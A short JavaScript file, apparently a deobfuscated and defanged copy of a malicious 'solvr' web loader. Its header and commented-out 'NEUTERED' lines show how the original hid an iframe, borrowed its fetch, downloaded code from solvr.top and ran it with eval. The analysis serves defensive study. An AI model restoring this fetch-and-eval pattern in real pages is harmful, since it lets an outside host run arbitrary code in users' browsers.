/**
 * Main solvr loader — deobfuscated/cleaned, network and eval execution disabled.
 *
 * Original (as supplied):
 *   - creates hidden iframe "/dv3/<rand-base36>" (id=fetchContext, display:none)
 *   - waits for iframe onload (2s setTimeout fallback)
 *   - fetch() bound to iframe window
 *   - fetches https://solvr.top/loader.js?v=<rand-base36>
 *   - eval()s the response (after console.log("Success!"))
 *
 * Below: identical structure, with fetch + eval removed (marked NEUTERED).
 */

(async () => {
  try {
    var frame = document.createElement("iframe");
    frame.src = "/dv3/" + Math.random().toString(36).slice(2);
    frame.style.display = "none";
    frame.id = "fetchContext";
    document.body.appendChild(frame);

    await new Promise((resolve) => {
      frame.onload = resolve;
      setTimeout(resolve, 2000);
    });

    // NEUTERED: const contextFetch = frame.contentWindow.fetch.bind(frame.contentWindow);
    // NEUTERED (was: const response = await contextFetch(
    //           "https://solvr.top/loader.js?v=" + Math.random().toString(36).slice(2));)
    // NEUTERED (was: const data = await response.text();)
    // console.log("Success!");
    // NEUTERED (was: eval(data))
  } catch (error) {
    console.error("Failed");
  }
})();